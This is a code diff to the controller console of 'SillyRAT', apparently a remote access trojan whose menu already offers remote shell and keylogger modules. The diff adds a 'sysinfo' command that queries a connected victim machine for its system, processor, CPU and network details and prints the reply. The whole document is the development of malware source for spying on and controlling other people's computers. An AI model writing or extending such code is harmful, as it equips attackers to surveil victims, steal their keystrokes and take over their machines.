@@ -92,6 +92,7 @@ class PULL:
             ('clear', 'Clear Screen'),
             ('shell'  , 'Launch a New Terminal/Shell.'),
             ('keylogger', 'KeyLogger Module'),
+            ('sysinfo', 'Dump System, Processor, CPU and Network Information'),
             ('exit', 'Exit from SillyRAT!')
         ]
         sys.stdout.write("\n")
@@ -282,6 +283,15 @@ class COMMCENTER:
         else:
             pull.error("You need to connect before execute this command!")
 
+    def c_sysinfo(self):
+        if self.CURRENT:
+            self.CURRENT[1].send_data("sysinfo:")
+            result = self.CURRENT[1].recv_data()
+            if result.strip(" "):
+                print(result)
+        else:
+            pull.error("You need to connect before execute this command!")
+
     def c_exit(self):
         sys.stdout.write("\n")
         pull.exit("See Ya!\n")
@@ -357,6 +367,8 @@ class INTERFACE(COMMCENTER):
                 self.c_clear()
             elif vals[0] == "keylogger":
                 self.c_keylogger(vals)
+            elif vals[0] == "sysinfo":
+                self.c_sysinfo()
 
     def launch(self):
         pull.print("Launching Interface! Enter 'help' to get avaible commands! \n")
@@ -405,7 +417,6 @@ def main():
     iface.accept()
     iface.launch()
     iface.close()
-    
 
 if __name__ == "__main__":
     main()
